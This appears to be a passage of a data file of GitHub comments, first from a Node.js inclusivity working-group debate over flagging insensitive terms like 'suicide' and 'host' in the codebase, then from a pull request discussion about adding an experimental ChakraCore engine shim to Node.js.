  - `insanity` may be insensitive, use `rude`, `mean`, `disgusting`, `vile`, `person with symptoms of mental illness`, `person with mental illness`, `person with symptoms of a mental disorder`, `person with a mental disorder` instead

**zlib**
- stupid (used in comment)
  - `stupid` may be insensitive, use `foolish`, `ludicrous`, `unintelligent` instead

**url**
- psychotic (internal variable)
  - `psychotic` may be insensitive, use `person with a psychotic condition`, `person with psychosis` instead`

**internal/repl** 
- disabled (part of a printout, would not break anything)
  - `disabled` may be insensitive, use `turned off`, `person with a disability`, `people with disabilities` instead

**docs**
The words ""host"", ""illegal"", and ""disabled"" come up many times in the docs... those are the only warning. ""disabled"" could be easily replaced with 0 consequence as they are not making reference to the api. 

**src/node.cc**
- stupid (used in comment)

**src/node_crypto.cc**
- disabled (used in comment)

**src/node_i18n**
- disabled (used in comment)

**test**

Not going to list them all.. but once again a combination of disabled, host, and crazy (or something to the same effect). There was also some examples of gender pronouns.

TLDR to follow below
"
4125	"> You can disagree with that approach but doing so means that you're valuing your prescription for how they should deal with these issues over including them in the project.

I would add to that, the goal of this endeavor is not to ""heal"" or ""shield"" people of things that have hurt them. If someone needs healing and shielding, there are trained professionals who can assist with that, who are much more qualified than anyone here. This project does, however, concern itself with 1) good code, and 2) getting as much good code as possible through inclusivity. This, then, is a recognition that certain words will drive off _some_ developers, and if those words can be avoided, it means they can help in the project. End of story. Not to decide authoritatively what is triggering for _all_, but to collaborate and determine as a community what would be a reasonable trigger for a large portion of the user base, and remove them so those affected can feel like they can contribute as well. That's why a diverse team is needed for @nodejs/inclusivity, so that it's not just cis/het/white males in SF that decide that. If you don't count yourself among those affected, and do not wish to review the code for these changes, then you don't have to. On the flip side, if you feel like you want to add your perspective to the inclusivity of the project, you can contact/apply to the inclusivity team to assist in deciding measures going forward.
"
4126	"So it seems as a project node is doing fairly well based on the quick pass with alex. The majority of our flags are for the words ""host"", which has historical context is is not likely to change.

Aside from that term there are a handful of instances, **in documentation only** where we could choose to use words that are just as effective.

It would be best, imho, to treat this subject with the true pragmatism that developers are known for. If a change has the potential to make the project more inviting to any human being, and the technical risk is low (in the case of changing suicide), or none (changing the words disabled and stupid in the comments), then there should be no reason not to.
"
4127	"> If a change has the potential to make the project more inviting to any human being, and the technical risk is low (in the case of changing suicide), or none (changing the words disabled and stupid in the comments), then there should be no reason not to.

+1
"
4128	"The one thing I do think that we need to be cognizant of is that being inclusive of **everyone** does include being inclusive and understanding to those who are not [neurotypical](https://en.wikipedia.org/wiki/Neurotypical). Our industry and community is made up of many outstanding and brilliant individuals who's brains genuinely function differently, and do not see this problem the same way.

We need to make sure that we treat those who are contributing with the respect they deserve, and make sure to not attack those that may just need some guidance or compassion when trying to navigate the landscape of node.
"
4129	"@HiPhish this isn't the place for your comments about words that do not even appear in our code. This is about a specific code base with specific language which we are changing to be a more inclusive software project. Also, if you think the project's strategy of attracting many contributors is a poor one that should be another issue entirely, because that is broadly the strategy for the entire project and foundation and has been since the foundation was formed.
"
4130	"One of the goals of the inclusivity WG is to get people from the impacted demographics involved, precisely so that this isn't the strawman of the privileged making decisions for the marginalized. 
"
4131	"+1 on being pragmatic about this. Trying to re-word very commonly used computing concepts (e.g. host, kill) is a bit much. Comments seem like the easiest low-hanging fruit to address as a starting place and guidelines can hopefully help keep them in a good state moving forward.
"
4132	"I mentioned this on #17, but I find the focus on language semantics and visceral negative reaction to those that use language in culturally insensitive to also be very unwelcoming to those that either are non-native speakers or who have a strong command of English, but by virtue of also viewing the world through the semantics of a second language might accidentally offend. 

I would much rather see a tolerant community form that learns to work together DESPITE our differences instead of this highly anglo ethnocentric direction discussions are taking. The English usage we are tolerant of should be English as the common language used by software engineers from anywhere in the world regardless of accident of their birth location or whether or not English is their first or second language. It should not be native English and all the cultural baggage associated with it that Americans (or the British) carry with them.

I would hope that anyone who has ever misused a word in a language that isn't their native one will appreciate this point. 

I would also hope that people be aware that the connotation of a word are also aware of the etymology of a word before they project their own cultural baggage upon that word and demand that language usage change because they are offended when the actual etymology of a term causes no offense. This is a path towards tolerance and acceptance. One example I've seen mentioned somewhere was someone claiming that the Finger protocol has sexual overtones when the actual origin of that computing term comes from ""snitching"" as in ""fingering (pointing out) someone from a police lineup"".

FWIW, native English speakers comprise a mere ~5.52% of the world's population. You're making this community unsafe and unwelcoming to a LOT more people than you're including by fostering intolerant semantic pedantry among native English speakers that are already among the most privileged in this community.
"
4133	"@malandrew for the sake of the scope of this thread, which I see as focused more on process (eg how do we make sure this happens) vs policy (eg what should be the strategy), perhaps it would be better to open a separate issue to discuss how @nodejs/inclusivity can address being inclusive of non-native-English speakers (and people with limited- or no- english proficiency).
"
4134	"@malandrew your assumption is that this language will be punitively policed when in reality it will be enforced the same way code style is enforced which is to correct during review in a non-punitive manor whenever the author is not intentionally offensive.
"
4135	"@jden My point is that this thread is solving the wrong problem. We shouldn't be trying to avoid problematic language because doing so fosters intolerance and creates and environment hostile to those that don't see language as problematic because they aren't native English speakers that grew up in the US or Great Britain.

A better question is ""How do we create an environment where tolerance among community members is rising instead of decreasing?"". This entire discussion promotes intolerance and serves as an example of intolerance being a new cultural norm.

As one of the weird nerds growing up, this growing environment of intolerance (of which this thread is an example) and victimhood is frightening. 
"
4136	"@mikeal You and I both know that that hasn't been representative of what has happened in our community. Today it might be 999 times out of 1000 that things quietly are dealt with via code review. How about that occasional event like with BN where professional reputations were at stake? Tolerance in this community is declining, not rising, so while today it's 1/1000, tomorrow it could be 1/100. All it takes is one person who likes to incite a mob to take something to twitter and then the peanut gallery shows up. The leadership I've seen has yet to step in and stop the peanut gallery (in fact, several have actively participated in it).

""It is better that ten guilty persons escape than that one innocent suffer""
"
4137	"Anyways, that's my last comment in this thread because I've already been the victim of this rising intolerance once before.
"
4138	"@malandrew 

> A better question is ""How do we create an environment where tolerance among community members is rising instead of decreasing?"".

You don't
https://www.youtube.com/watch?v=0OzL0tGygso

This is something that will sort itself out. If people talk like edgy teenagers they code like edgy teenagers as well. Just ignore them and the problem will solve itself.
"
4139	"@malandrew @HiPhish We'd like to try to keep issues on topic. I've created an issue (linked below) to discuss your specific concerns. If you'd like to continue the discussion, please take it over there. Thanks!

https://github.com/nodejs/inclusivity/issues/19
"
4140	"Perhaps PRs that include changes to the public API should be flagged for review by @nodejs/diversity ... Not all changes have.  While I agree with @malandrew in terms of people generally being overly sensitive and spreading new kinds of intollerance, there could be some issues with terminology that are poor design choices, such as the issue the @isaacs mentions towards the top of this thread.

While I am not suggesting that we change the past, or revert prior design choices.  I also feel that keeping in line with common technology terms are usually more appropriate.  I am in line with the suggestion that future changes should probably be looked at more proactively.  There are times where society needs to adapt, and there are times individuals need to adapt.  Context is everything.
"
4141	"The word ""disabled"" (as opposed to ""enabled"") for a setting is now a bad word? Along with ""host"" and ""illegal""? Are you guys shitting me?
"
4142	"@Fishrock123 ... at this point, I'm -1 to introducing any kind of automated checking as part of CI. A check through the code does not highlight any other obvious potential issues that cannot be handled on a case by case basis as necessary. Documenting a best practice as part of the contributor guidelines to watch for things that potentially could be problematic is fine. 

I recommend closing this issue.
"
4143	"+1 on closing and locking.
"
4144	"+1 on ending all PC discussions (from both those in favor and those against) and focusing on only issues that actually impact how the NodeJS source code functions. 

Inviting all this discussion in the first place has been one of the most toxic things I've ever seen in the open source community. 99.99% of open source projects get by just fine without any of this discussions. There's nothing inherently special about the scale of NodeJS that suggests that it should be run any differently that any of the projects of smaller scale.

Code is neutral and should be managed like Switzerland when it comes to PC issues. There are plenty of forums to have such discussions without poisoning this well with bikeshedding discussions (which is exactly what any PC issue is). We should acknowledge that all this is bikeshedding and banish it in favor of issues that actually have to do with features, bug fixes and other _objective_ improvements to the NodeJS codebase. 
"
4145	"@malandrew :+1:  NodeJS is about code and it's functionality. Not about subjective differences and discussions (including, but not limited to PC discussions.)
"
4146	"Hi @samis @malandrew , I'd like to reiterate https://github.com/nodejs/inclusivity/issues/9#issuecomment-156541929: The question of whether or not we care about language is not currently up for debate in this issue. This issue seeks to explore solutions on how to implement this care.

The working-group has already decided that people and language and feelings and inclusivity matter. If you'd like to discuss ways to handle that, then we welcome your participation. However, further claims that code is somehow ""neutral"", somehow not about people or their feelings, etc, will be considered derailment. 
"
4147	"@ashleygwilliams In another thread @jasnell stated that the inclusivity working group doesn't even have an official charter and is up to debate, so stating that that ship has sailed and it's not up to debate misrepresents the facts:

https://github.com/nodejs/inclusivity/issues/19#issuecomment-157184766

That said, I'm not saying that language doesn't matter (as someone who identifies as pomosexual, I'm as careful about avoiding gendered pronouns as anyone I've ever had discussions about gender with). What I'm driving at is that the working group should be aware of the intolerance ramifications of fostering an increasingly politicized atmosphere that is exclusive of those who wish to avoid politics and focus on code. I am not debating the merits of such things. I agree with you. I am debating the merits of making the NodeJS community of forum for political agendas, because politics does alienate people. 
"
4148	"I'd like to repeat the call to close and lock this thread, as multiple good process and tooling suggestions have been offered to the OP and we don't seem to be covering new ground.
"
4149	"+1 on locking.
"
4150	"there's no need to close or lock the thread. we will close it when we decide on a solution and then ship that solution. you are, however, welcome to stop commenting or participating whenever you would like.
"
4151	"+1 to keeping the thread open. We need to codify how the working group is handling issues and write it down for clarity, but the current expectation is that threads stay open until an issue is resolved or deemed that it won't be resolved. Neither has happened here, so it shouldn't be closed.
"
4152	"Ok regarding the ""kill vs. stop"" debate: I actually think it's very problematic to change this because there were some guys battling and fighting to figure out how to end processes in a reliable manner for good and when they found the final solution to this problem they named it. You all come from a place of privilege regarding this matter, having not figured this stuff out for yourselves and enjoying the fruits of the labor so I suggest we drop this matter and keep the name as intended by the people who fought for this problem in the first place. Checking your privilege is one of the main things we have to do here.
"
4153	"TRIGGER WARNING:
@ashleygwilliams uh and regarding your ""don't be rude"" comment.. I actually think that's really offensive of you to imply that he was being rude, he was probably UNAWARE of his privilege and pointing this out to him without a trigger warning is actually problematic.
I suggest you check your privilege ashley.
"
4154	"@malandrew 

> What I'm driving at is that the working group should be aware of the intolerance ramifications of fostering an increasingly politicized atmosphere that is exclusive of those who wish to avoid politics and focus on code.

Well said. I'm not involved with Node.js in any way, (and never will be, probably) but I have been viewing these discussions from a distance and am concerned. Everywhere I go, things are getting more and more politicized. It really puts me off and I'd never work with people who are so hypersensitive. Often not even about things said to them, but just the possibility of offending some other person in some group they think deserves protection.

Being Dutch, this concept of politicizing everything is somewhat foreign to me, but I can see it creeping in, everywhere. I had the illusion that the coding community would just care about coding, but I'm afraid I'm wrong. Forums on programming are littered with identity politics, and even in Node.js we are asked to watched our words. I just hope all this political bs will come to an end very soon.

I'd never work with a team which takes the attitudes prevalent here. I just hope there will be plenty of teams where this will never be the norm.
"
4155	"Back to the OP's question and https://github.com/nodejs/inclusivity/issues/9#issuecomment-156554098, I think it is most reasonable to take a look at words that we ourselves use that aren't apart of another layer / common outside terminology. Like, suicide is our mess, host and disable / enable are not.

Aside: I don't understand how Host is possibly insensitive? http://www.merriam-webster.com/dictionary/host & https://en.wikipedia.org/wiki/Host

Edit: I guess:

> Host (psychology), ""personality"" as emphasized in treating dissociative identity disorder

But that's the far less common usage.

Aside no.2: English is terrible and doesn't have enough words for types of things.
"
4156	"@Fishrock123 Alex catches `host` because it is (depending on its use) masculine (`hostess` being feminine, [Wikipedia](https://en.wikipedia.org/wiki/Host)). Similar to `steward` and `stewardess`. Opting for a different word (`presenter` or `entertainer`, and in the other example `flight attendant`) doesn’t have this gendering / binary-thinking.

Of course, the word is used differently in networking, but some people would still prefer an alternative because of this connotation.
"
4157	"@wooorm Good catch and noted, although at this point I don't think it's a good idea to change that.
"
4158	"I hope you are sane enough to not be that oversensitive right? `host` is offensive because it's masculine? You gotta be kidding me.

Is this a case of poe's law or something?
"
4159	"There is near consensus here that it doesn't make sense to ""fix"" words that are common programming language terms (e.g. host, kill). Considering that, let's focus the discussion on avoiding the addition of new apis/comments/etc. that add new terminology that is unnecessary/unwelcoming/etc. 
"
4160	"@juliepagano 
Please help me understand this, because I don't get it at all. What could possibly be 'unwelcoming' terminology? Are you guys working on the gofuckyourself API or something?
"
4161	"@Wysaard The issue linked near the top of the thread is an example of unwelcoming terminology that does not have a preexisting basis in programming terminology. It's not a common occurrence, but it would be nice to minimize these sorts of things being added to the codebase in the future.
"
4162	"@juliepagano
You mean `suicide`? I don't get how that's unwelcoming. It seems quite neutral, and accurately describing what it does.

Of course, if someone you knew committed suicide it can trigger emotional distress. But do we really have to use language in such a way that nobody will ever have their feelings hurt? Soon even trigger warnings will be out of the question, because someone killed himself with a gun and now 'triggers' are triggering. We can't have a painting program, because someone was killed by a getting a bucket of paint thrown to their head. This is a slippery slope into absolute madness.
"
4163	"@lars i think you have made your point and we will take it into consideration for future discussion. we as a group have discussed this at length on the node thread itself, which has already been closed. thanks for participating.
"
4164	"@ashleygwilliams
Yeah ok. Sorry for being so 'militant' about this. I'm just amazed at this whole thing being an issue.
"
4165	"@Wysaard i don't think you are being ""militant"". there are a lot of feelings around these issues, so conversations get impassioned. it's all good.
"
4166	"@wooorm How about in biology where there are terms like ""host organism"". Seems like host is a pretty gender neutral term that can in some instances also be used as the masculine term and not the other way around.

http://www.etymonline.com/index.php?term=host

I don't see anything etymologically that suggests any strong relation to that term being peculiarly masculine beyond what is being imagined by a few. I don't see this as any different than the tendency of some to confuse phonemes with morphemes either intentionally or out of ignorance (e.g. imagining that every instance of the phoneme ""man"" refers to morpheme relating to men as opposed to a morpheme that has some other origin like hand (manus in latin), such as in the word ""manual""). I would hope that as a community that is typically nerdy or geeky, that would would take pride in seeking out knowledge and learning the true origins of words and how they evolved over time instead of being inclusive of willful ignorance, unless we're actually arguing for being inclusive of the ignorant, willful or not (I hope not)

Arguing for this is comparable to arguing to get rid of the 2nd and 3rd person plural conjugation of verbs in pretty much every romance language since they almost always are used for homogenous groups comprising of only men or a heterogenous groups of men and women?

http://www.smbc-comics.com/index.php?db=comics&id=2164

FWIW, neither `presenter` or `entertainer` capture the semantics that `host` does if you look at the etymology of the term host and how it's used in computing. 

related: Wadler's Law, https://wiki.haskell.org/Wadler's_Law
"
4167	"hi @malandrew and @wooorm . thanks for your comments, we'll consider them in future discussions. for now tho, this thread is not for the discussion of specific words that could be hypothetically brought up as issues, but rather general strategies.

when/if those words (i.e. host) are brought up as problematic in the node repository, these comments would be useful. until then, please do not continue to address specific words here. continuing to do so will be considered derailing.

thanks!
"
4168	"My suggestion then is to not worry about this and deal with words on a case by case basis. If no one objects to a word, it's not a problem. To do anything else is premature optimization. AFAICT, we have exactly two concrete examples of things we want to change, `suicide` and gendered pronouns. This is hardly a common enough problem that we have enough cases to abstract out a common solution either via process or algorithm. 

What I would like to suggest is that we stop this lexical witch hunt that I've seen in other threads. Unless a sufficient number of individuals **independently** claim to be offended by a word, it's not an offensive word. I want to emphasis the need for these to be **independent** claims of offense. 

Provide a form where people can submit a specific line of code that contains something offensive and when enough people highlight the same line independently, we can address it. The people claiming offense should be people actually reading the code. The litmus test for people actually reading the code are people contributing issues and pull requests. I can't see any reason for anyone to be reading source code besides debugging a problem to provide a detailed issue or intellectual curiosity with the intent of participating in the community. These problem words should be sufficiently rare that someone likely has already contributed before they actually encounter one. 

The process should be somewhat resistant to people trying to game the process for their political goals, such as recruiting many people to pile into an issue to ban a word. Honestly, anyone bandwagoning into a thread like the one about the use of the word `suicide` trying to get it removed can't really be that offended/triggered by the word if they are comfortable participating in a debate about the word. If something were truly triggering, they wouldn't be participating in that thread to begin with (which leads me to believe that a lot of the words cited thus far are part of a lexical witch hunt to see who can find the most ""witches"" in the codebase). I'd love to see Arthur Miller's take on this with an Open Source themed version of The Crucible. Every generation has their witch hunt. This is ours. 
"
4169	"thanks for your feedback @malandrew. however, we are keeping this issue open. 
"
4170	"@ashleygwilliams that's fine, I didn't suggest ""+1 on closing this issue"". Would be nice if you actually considered my suggestion instead of dismissing it as merely a ""+1 on closing this issue"". I didn't write it for nothing and it did include suggestions of what might be added to a process/policy. 
"
4171	"@malandrew, be aware that some people participate in these threads via email, and those email threads don't update when you edit a comment. The original email I got for your message ^^^ 3 up was just the first paragraph, which could have been construed as a ""+1 on closing the issue"".

That being said, I'll go back to lurking.
"
4172	"@malandrew The comments about this being a witch hunt are not constructive or productive. This is a polite request for you to focus on constructive feedback while participating in this repo.

Your suggestion for a form where people submit concerns about language in the code is noted.
"
4173	"Could someone please explain to me why it is an important use of time and effort to obsess over and  change the names of things in the code of a javascript runtime, rather than actually improving its functionality?
"
4174	"What would you call it when people are out actively looking for words which might under some really suspect circumstances cause offense to some imagined person without any real person actually taking offense and bringing up the offense themselves? I'm open to a different term than witch hunt. Would love an alternative suggestion for identifying this common scenario if you have one.
"
4175	"The purpose of this issue is to discuss ways to address potential language changes, not to bikeshed over whether the WG should address them or not. If people would like to continue discussing that, please create another issue to do so instead of continuing to attempt to derail this discussion.
"
4176	":+1: @juliepagano 

further continuation of this line of argument will result in deleted posts.
"
4177	"I would make another issue, but it would probably be deleted, knowing the past of this repository. 
"
4178	"New issues that follow the [node code of conduct](https://github.com/nodejs/node/blob/master/CODE_OF_CONDUCT.md) and are on topic for the working group will not be deleted. If you are concerned about an issue being deleted, I recommend reviewing the code of conduct and the work-in-progress group charter for context about what is appropriate here.
"
4179	"@Wysaard your comment employed harrassing language and has been deleted. feel free to restate your comment in more constructive language.
"
4180	"@ashleygwilliams Please enlighten me on what was 'harassing' about my comment, so I won't make that mistake again.
"
4181	"you could have used the word complaining instead
"
4182	"I made a new issue. Also, in response to the above post: why does it matter what word is used? The point still got across, and the word was used to show the poster's frustration. I don't see how the comment was more than an _effective_ use of language. Silencing people because you don't like the way that they talk is hilarious irony considering the purpose of this repository. 
"
4183	"There is a huge semantic gulf between those two. 

Some complaints are legitimate and should be considered (i.e. the person who is actually offended by something ""complains"" so that others can consider whether or not there term is broadly offensive or merely something that offends one individual).

Some complaints are not complaints at all (i.e. ""I found this word in the source code that in a completely different context may offend people. Since we want to purge the English language of all words that might cause offense even in an unrelated context, I'm nominating it for inclusion on the list of words that will not be missed. They'd none of 'em be missed. They'd none of 'em be missed!"").
"
4184	"Here's an attempt at something that doesn't hurt anyone's feelings:

I suggest dealing with 'problematic language' in the following way:
Language will be changed if and only if it does not strike a good balance between clear and concise. E.g. the language does not accurately describe what it is suppossed to describe, or some name is impractically long, etc. One cannot always take everyone's possible triggers in consideration, as people can be triggered by pretty much everything.

I don't even want to be involved in this entire discussion really, but I don't want to see things like this, which I consider a solution looking for a problem, spreading. And it's spreading quickly.

@TheAlphaNerd Right. If this wasn't some big project I would've seriously thought you were joking. Is there anyone here who has serious trouble dealing with a comment that uses 'bitching' instead of 'complaining'? My use of words should reflect on my immaturity if anything, but I can't see how I'm not even allowed to say such a thing.

I'd also like to object to my language being harassing. Calling 'complaining about choice of words' 'bitching' does not constitute harassment as far as I'm aware, but maybe that's just because I'm not a native speaker and I haven't a clue what I'm talking about.

Having said all that, I think this is my last comment on this issue. I'm sick of this whole thing, and we're not getting anywhere anyways.

Happy hacking, have a good one.
"
4185	"Regardless of what your intent might be, you should try to be more considerate of how the tone of your writing could be interpreted. I, and seemingly many others, have found several comments in this thread to sound aggressively dismissive and minimizing. Personally, I'm a bit offended that one would push so firmly against allowing the community to show some empathy for each other by simply being considerate of what terminology we choose to use.

Some words are _more_ problematic than others. Personally, I don't feel like many people would be offended by ""host"" but I definitely feel ""suicide"" could be troubling terminology for a number of people. That having been said, if the community disagreed with my assessment that ""host"" is not really that offensive, I would listen to what they had to say and try to accommodate their view. That's how you empathy good; you work to understand and accommodate the needs and views of the people around you.

In this case, I see some people have the view that code clarity is more important than avoiding problematic terms. Maybe we're both right. Maybe it's all important and, if we work together, we can figure out the right balance? That's the whole purpose of the inclusivity group: not to be word police, but to help guide the node community toward being even more friendly and inclusive.
"
4186	"@Qard I identify as fiction-kin vulcan and feelings of any kind are offensive to me, so please me mindful of your language as well.
"
4187	"Can we separate out what we might deem as problematic language (what this thread keeps derailing into), and the idea of somehow checking PRs for it (whatever problematic may be) (as the OP intended)?
"
4188	"@Fishrock123 ... I very much dislike the idea of any form of automatic CI-integrated checking. The review process for PRs is the right time and place to look for and catch those kinds of issues. On the off chance someone finds something existing in the code currently we can deal with it quickly as we've done with the `.suicide` flag. Having automated checking of any type in place is simply unnecessary.

To answer @isaacs original question, ""_Are there any processes that can be put in place to avoid situations where a word choice can be problematic/distracting/triggering/offensive to users?_"", the answer is simple: do what we're already doing. After all, that's _exactly_ how the `.suicide` flag was caught and here we are a week later with a solution already decided on. 
"
4189	"+1 @jasnell 
"
4190	"@jasnell Thanks, I think you're probably right.  I'm fine with closing this.  I think the OP question has long since been answered.
"
4191	"Closing then. Thank you @isaacs
"
4192	"funny how this thread keeps coming back to life a month after it was closed
"
4193	"Maybe there is a reason for this?
"
4194	"@stuntguy3000 i'd presume it's because of a thread on some other website pointing to this one
"
4195	"@kunalspathak Thanks for the PR! This has a very large impact so please expect review to take a considerable amount of time. :)
"
4196	"VERY cool! Don't envy the code reviewers here though!
"
4197	"This is by far one of the coolest things I've seen happen to Node.js since the convergence of io.js and Node.js.
"
4198	"Legit. Thanks, cant wait until this happens :+1: 
"
4199	"The review will really take a lot of time and scrutiny! :fork_and_knife: 
"
4200	"+:one: guys, really good job! :boom:
"
4201	"This is incredibly cool, I have a request.

Please do not post comments on the GH issue unless you have something important to add. These issues gain a lot of attention and it makes it _incredibly_ hard for collaborators to communicate.

Locking the issue to collaborators means other people from the outside who have a significant ****\* contribution or want to help can't do that.

Comments like +1 -1 and such create a significant amount of noise.

Support open source, keep the discussion clean.

EDIT(@trevnorris): Possible accidental use of inappropriate word? Has been removed.
"
4202	"@kunalspathak What happens when v8 needs to be updated and the API doesn't match the Chakra shim? Will we need to hold off until the shim also has an update?
"
4203	"@kunalspathak ... thank you for submitting this. As you can imagine, it's going to be a big review and could take some time to settle out.

@trevnorris ... I have separately reached out to each of the V8 and Chakra teams and invited both to sit down face to face to work through the API/ABI impact of this change and figure out how we can make the ABI layer more robust. I'm working out the logistics for that face to face now and want to make sure to extend the invite to all the @nodejs/ctc members as well. There are a ton of questions this brings up and I think sitting down for an afternoon to hash things out would be quite productive.
"
4204	"Marking it as semver-major _for now_ (just to be safe), although semver-minor might be appropriate once we get further along in the review. Very happy to see this tho.
"
4205	"Maybe this is a stupid question, but what is the advantage to this PR? To use Chakra instead of V8, right? Is that a runtime specification or a build specification?
"
4206	"Am I correct that this currently works only on Windows platform? Initial Linux support is still on the roadmap of ChakraCore: https://github.com/Microsoft/ChakraCore/wiki/Roadmap. And that is decribed as «make it link, make it run, no JIT».
"
4207	"Yes, its currently Windows only. For cross-platform support, the key target for next six months on the roadmap is to get the interpreter & runtime working. JIT would come after that (don't read it as no JIT forever - it was just a breakdown of what we need enable and its ordering for next 6 mos). 
"
4208	"Will ChakraCore be treated as a first-class citizen? That is:
1. Will there be binary builds with ChakraCore for each Node.js release provided from the nodejs.org site?
2. Would it be guaranteed that ChakraCore must work with every next Node.js version, or would it be ok if v6.2.0 builds with ChakraCore, v7.0.0 breaks with ChakraCore (let's say the shim update didn't get in in due time), and v7.1.0 works again with ChakraCore?
3. What if v7.3.0 breaks again with ChakraCore in a semver-minor version, because of some additive change that didn't get yet ported to the shim?
"
4209	"@ChALkeR I think those questions can't be answered until _after_ this PR lands. We have support in Node.js for architectures that we don't have in CI and pretty much all the ones we do have were added some time after support for the architecture was landed. I don't think anyone wants to add another vector to CI until we know there is some stability here and we're only going to figure that out after it lands.
"
4210	"@ChALkeR ... at least in my opinion, it depends on what is meant by ""first-class citizen""
1. For the very near term, likely not. Having officially supported builds of Node+ChakraCore is likely quite some time off and wouldn't be able to happen at least until the cross-platform work is done. Similar to how we (IBM) handled our Node-on-PPC and Node-on-AIX builds, it would be more likely that Msft would host their own downloads with builds of Node+ChakraCore (please correct me if I'm wrong @orangemocha or @kunalspathak), at least until a decision is made to officially provide Chakra support.

2 and 3: I think it's too early to determine that. Given the dependency on the V8 APIs currently, and given how quickly those _could_ change, there will need to be dedicated effort by Microsoft and other interested collaborators to ensure that the Chakra shim continues to work. It is entirely possible that semver-major update of V8 could land that could break these. Until we're sure that the shim is stable, we likely won't want to commit to ensuring that things would continue to work.

+1 to what @mikeal just said as I was typing this :-) 

What I'd personally like to see is getting this landed but clearly indicating that it is experimental and unsupported for the time being.
"
4211	"@mikeal @jasnell You mean that the initial answer is «no» to all questions (i.e.: no guarantees at all for the time being), with a possibility to change in the future? That seems legit.
"
4212	"Yup, this is sort of a classic ""let's put this behind a flag and see what happens"" situation :)
"
4213	"> Yup, this is sort of a classic ""let's put this behind a flag and see what happens"" situation :)

As a note, this is not a runtime feature, so it is explicitly behind a build-time flag.
"
4214	"It seems like a nightmare to support.

Imagine the following: someone make a PR that uses v8 API. CI breaks on Chakra build, because shim doesn't support said API. What we are going to do? wait until Chakra implements them? abandon the PR?

What if next week someone PRs support for JSC or SpiderMonkey?
"
4215	"@vkurchatkin If I read the answers above by @mikeal and @jasnell correctly — ignore the breakage and land, but mention the people who will support ChakraCore and give them a chance to fix this.
"
4216	"@vkurchatkin ... initially, we would not gate acceptance of any V8 changes based on whether or not it breaks Chakra. The responsibility would be on those collaborators who are supporting the experimental Chakra support to update that code to work again.
"
4217	"> Imagine the following: someone make a PR that uses v8 API.

The general direction the project wants to go in is to become more vm agnostic, which means using less of the API, not more, and moving towards a neutral API that all vm's can support natively. That's a long way off, we have a lot of work to do, but this is the first step in that direction.
"
4218	"@ChALkeR well, the goal is to make it officially supported one day, obviously. Otherwise committing this code doesn't make anything. So, when we decide that it **is** supported, what would be the answer then?
"
4219	"> The general direction the project wants to go in is to become more vm agnostic, which means using less of the API, not more, and moving towards a neutral API that all vm's can support natively. That's a long way off, we have a lot of work to do, but this is the first step in that direction.

This seems to be a step in the opposite direction, really. I mean, it implements v8 API, not _neutral_ API. Also, adding another vm into source tree seems like a step in the opposite direction as well.
"
4220	"@jasnell 

> What I'd personally like to see is getting this landed but clearly indicating that it is experimental and unsupported for the time being.

Then it should go on a dedicated branch, not master.
"
4221	"> Then it should go on a dedicated branch, not master.

That's just not in line with how we've added any experimental features before. Branches might be used from time to time to develop a feature but it's never used by the public until it lands in `master`. For instance, AsyncWrap has been experimental and in `master` for quite a while.
"
4222	"Before we start running this on our CI -- @kunalspathak do you have output of `vcbuild.bat test` somewhere?
"
4223	"@mikeal Sounds exactly like what a change like this deserves. 
"
4224	"@Qix- Note: this does not replace V8, it only gives a built-time option to.

Edit @joshmanders, nope, sorry!
"
4225	"@Fishrock123 was that meant to be directed at me?
"
4226	"@jbergstroem  [vcbuild.bat test output](https://gist.github.com/jianchun/c5d5973ca62c240db4fc)
"
4227	"I'm slightly concerned about download size of our repository. Having a big chunk of code living there and not being used in 99% of cases seems to be a huge waste of bandwidth. (I know many people clone the repo, or get the source from tarballs)
"
4228	"@vkurchatkin ... it's a _step_ in the right direction, it's not the only step :-) The next step is to begin moving towards a more abstracted ABI between Node core and the VM layer, which is something that ought to make a LOT of things in core easier... for one, we'd be able to take V8 updates faster than we currently do, even potentially landing new V8 majors within stable branches. It's a long road, however, and there are many steps along the way that still need to be figured out. 
"
4229	"@indutny ... I do share the concern over download size. One possible approach is to handle this similar to how we handle the ICU dependency. _IF_ the config option is set to use this, then the build goes out and grabs the tar file and drops it into the deps folder, then and only then is this large chunk of optional code downloaded.
"
4230	"If we're considering pulling in stuff during build time we need to ping @nodejs/build :)
"
4231	"Many APIs and/or options didn't come to exist for the sake of platform equality (thinking about sendfile for example), is this about to change or are you going to wait for Linux/Mac compatibility of Chakra?
"
4232	"@jasnell I'm really trying to see how it makes transitioning to abstract VM API easier, but I can't. I clearly see how it will make maintaining node much more difficult in short term, though.
"
4233	"I'm not seeing how it makes maintaining node more difficult in the short term as maintaining support for the Chakra shim _would not_ be in the critical path of any other changes. For the majority of collaborators, in the short term, they could simply ignore the Chakra stuff and would be perfectly fine. There would be zero impact. If we made it a download-on-build option then it would be even less of an impact. 

In the long term, it helps making the transition to an abstract VM API easier because the Chakra team has had to go through this exercise of getting Chakra to transparently act like V8. That means they've gathered a significant amount of experience about what it would take to create that abstraction. By combining their experience and bringing the various teams together for discussion, we can begin to identify how that abstraction needs to be defined.
"
4234	"I haven't seen anyone answer _why_ this should be added.

_Why_ should node support the ChakraCore engine? What are the benefits of doing so?
"
4235	"+1 to making this downloadable on demand at build time like the intl data.
"
4236	"+1 to what @jasnell said:

> initially, we would not gate acceptance of any V8 changes based on whether or not it breaks Chakra. The responsibility would be on those collaborators who are supporting the experimental Chakra support to update that code to work again.

... but hopefully when and if the Chakra team has proven their ability to keep up with those breaks, we'll be able to include support in stable releases. I guess we will cross that bridge when we get there, and it's a good idea to deem this as 'experimental' for now.

We can still add support for ChakraCore in CI, so that at least we know when things break, even though it wouldn't prevent acceptance of PRs. I will get working on that.

In terms of reviewing this change, I am tempted to say that we could treat the stuff under deps/ as a black box. The remaining delta is actually fairly small.

@kunalspathak it might make sense to maintain ChakraShim in its own repo, and update it here as a whole.
"
4237	"> I'm not seeing how it makes maintaining node more difficult in the short term as maintaining support for the Chakra shim would not be in the critical path of any other changes. For the majority of collaborators, in the short term, they could simply ignore the Chakra stuff and would be perfectly fine. 

I'm talking about period after that. 

> In the long term, it helps making the transition to an abstract VM API easier because the Chakra team has had to go through this exercise of getting Chakra to transparently act like V8. That means they've gathered a significant amount of experience about what it would take to create that abstraction.

So, they've already done that. If this code remains in a separate repo, their experience is not going to become any less useful.
"
4238	"I'm not very comfortable landing anything that has [51 test fails](https://gist.github.com/jianchun/c5d5973ca62c240db4fc) on the currently only supported OS, be it optional or not. I'll look at running the PR against our own CI shortly.
"
4239	"@jbergstroem - We are aware of these test failures and most of the unit test failures are because of unimplemented features in chakrashim. We are working on getting them to 0 failures. We will keep this thread posted on our status.
"
